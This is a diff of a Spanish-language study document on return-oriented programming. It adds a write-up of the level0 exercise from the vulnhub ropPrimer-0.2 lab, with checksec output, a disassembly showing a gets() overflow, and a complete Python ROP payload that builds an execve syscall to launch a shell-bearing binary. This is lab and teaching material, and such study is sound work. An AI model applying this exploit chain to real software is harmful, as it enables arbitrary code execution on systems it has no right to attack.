@@ -521,8 +521,9 @@ Comprobamos que funciona si terminamos de ejecutarlo:
 Segmentation fault
 ```
 
+###EJERCICIOS
 
-*EJEMPLO 2*
+**EJEMPLO 1**
 
 https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-iii/
 
@@ -635,12 +636,138 @@ payload = junk + rop
 print payload
 ```
 
-*EJEMPLO 3*
+**EJEMPLO 2**
 
-De la máquina de vulnhub ropPrimer-0.2, en la que hay 3 niveles
+De la máquina de vulnhub ropPrimer-0.2, el caso level0.
+https://www.vulnhub.com/entry/rop-primer-02,114/
+
+Este ejercicio lo intenté resolver aplicando la primera técnica explicada aquí, pero no se por que razón en la MV me daba "Segmentation fault" mientras que en el gdb funcionaba ya que lanzaba un proceso con una shell nueva. 
+Veamos previamente lo que yo intenté y luego la solución mucho más sencilla y elegante que encontré después.
+El binario level0 viene sin protecciones casi, pero yo intentaba aplicar la llamada a execve explicada al principio. 
+Protecciones:
+
+``` 
+gdb-peda$ checksec 
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+``` 
+El ensamblado muestra el típico buffer overflow:
+
+``` 
+Dump of assembler code for function main:
+   0x08048254 <+0>:	push   ebp
+   0x08048255 <+1>:	mov    ebp,esp
+   0x08048257 <+3>:	and    esp,0xfffffff0
+   0x0804825a <+6>:	sub    esp,0x30
+   0x0804825d <+9>:	mov    DWORD PTR [esp],0x80ab668
+   0x08048264 <+16>:	call   0x8048f40 <puts>
+   0x08048269 <+21>:	mov    DWORD PTR [esp],0x80ab680
+   0x08048270 <+28>:	call   0x8048d80 <printf>
+   0x08048275 <+33>:	lea    eax,[esp+0x10]
+   0x08048279 <+37>:	mov    DWORD PTR [esp],eax
+   0x0804827c <+40>:	call   0x8048db0 <gets>
+   0x08048281 <+45>:	lea    eax,[esp+0x10]
+   0x08048285 <+49>:	mov    DWORD PTR [esp+0x4],eax
+   0x08048289 <+53>:	mov    DWORD PTR [esp],0x80ab698
+   0x08048290 <+60>:	call   0x8048d80 <printf>
+   0x08048295 <+65>:	mov    eax,0x0
+   0x0804829a <+70>:	leave  
+   0x0804829b <+71>:	ret    
+End of assembler dump.
+``` 
+El binario "peta" cuando le metes más de 44 caracteres. Se trata ahora de buscar gadgets para conseguir la llamada a la función execve, que recordemos tiene que contener lo siguiente en los registros:
+
+```
+    EAX = 0xb (syscall execve)
+    EBX = puntero a cadena
+    ECX = 0x0 (NULL)
+    EDX = 0x0 (NULL)
+```
+Este es el python que hice después de buscar los gadgets necesarios con la herramienta ropme:
+
+```python
+#!/usr/bin/python
+
+from struct import pack
+
+# Peta en 44
+junk = "A" * 44
+
+#GADGETS
+
+gad1 = 0x80525ed		#pop ecx ; pop ebx ;;
+gad2 = 0x80c8946		#inc ecx ;;
+gad3 = 0x80525c6		#: pop edx ;;
+gad4 = 0x8068c63		#: inc edx ; or al 0x5d ;;
+gad5 = 0x8097bff		#: xor eax eax ;;
+gad6 = 0x806a60f		#: inc eax ;;
+gad7 = 0x80525ee		#: pop ebx ;;
+#gad8 = 0x806fea8		#: int 0x80 ; pop ebp ;;
+gad8 = 0x8052cf0		#: int 0x80 ;;
+
+#AUXILIARES
+padding = 0xdeadbeef
+poncero = 0xffffffff
+cadenaux = 0x080b0ee6
+valor = 0x0000000b
+
+#PAYLOAD
+
+rop = pack('<I',gad1)
+rop += pack('<I', poncero)
+#rop += pack('<I', padding)
+rop += pack('<I', cadenaux)
+rop += pack('<I', gad2)
+rop += pack('<I', gad3)
+rop += pack('<I', poncero)
+rop += pack('<I', gad4)
+rop += pack('<I', gad5)
+rop += pack('<I', gad6)
+rop += pack('<I', gad6)
+rop += pack('<I', gad6)
+rop += pack('<I', gad6)
+rop += pack('<I', gad6)
+rop += pack('<I', gad6)
+rop += pack('<I', gad6)
+rop += pack('<I', gad6)
+rop += pack('<I', gad6)
+rop += pack('<I', gad6)
+rop += pack('<I', gad6)
+#rop += pack('<I', gad7)
+#rop += pack('<I', cadapic)
+rop += pack('<I', gad8)
+rop += pack('<I', padding)
+
+payload = junk + rop 
+
+print payload
+```
+Y aquí la ejecucción en el gdb donde se muestra que inicia un nuevo proceso:
+
+```
+gdb-peda$ 
+process 3214 is executing new program: /root/Documents/Seccon/ropvulnhub/level0/processor
+```
+Tened en cuenta que se lanza un nuevo proceso llamado "processor" que coincide con una cadena que tiene el binario y nosotros hemos utilizado ese nombre para crear un binario con ese nombre y que contenga una shell. Es la técnica de la cadena del binario, no la de la variable EGG del entorno. 
+```
+rabin2 -z ./level0 | grep processor
+Warning: Cannot initialize dynamic strings
+vaddr=0x080b0ee6 paddr=0x00068ee6 ordinal=356 sz=10 len=9 section=.rodata type=ascii string=processor
+```
+Aquí hay que constar que antes lo intenté con otra cadena:
+```
+vaddr=0x080ace48 paddr=0x00064e48 ordinal=133 sz=5 len=4 section=.rodata type=ascii string=apic
+```
+Pero no funcionaba porque en la dirección de la cadena contiene el código 0a
+
+
 
 
 ---------------------------------------------------------------------------------------------------
+**EJEMPLO ??**
 El caso de cheer_msg (otro día porque creo que no es un ataque a GOT, tengo que estudiarlo más)
 
 
